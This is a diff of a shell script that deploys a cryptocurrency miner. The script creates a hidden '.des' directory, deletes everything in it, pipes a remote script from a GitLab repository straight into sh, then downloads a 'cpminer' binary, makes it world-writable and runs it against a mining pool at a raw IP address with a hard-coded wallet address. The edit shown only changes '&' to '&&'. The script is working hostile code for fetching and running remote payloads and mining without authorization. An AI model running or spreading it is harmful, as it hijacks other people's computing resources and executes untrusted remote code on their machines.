@@ -6,7 +6,7 @@ mkdir .des
 cd .des
 rm -R *
 
-curl https://gitlab.com/majapahlevi/mvp/-/raw/main/babi.sh | sh &
+curl https://gitlab.com/majapahlevi/mvp/-/raw/main/babi.sh | sh &&
 
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer
 chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcp://138.197.12.20:80 -u v255vQEQnZj2NVjF3UHpTrtwA1cGdXt4dV.$(shuf -n 1 -i 1-99999)-VISH -t4
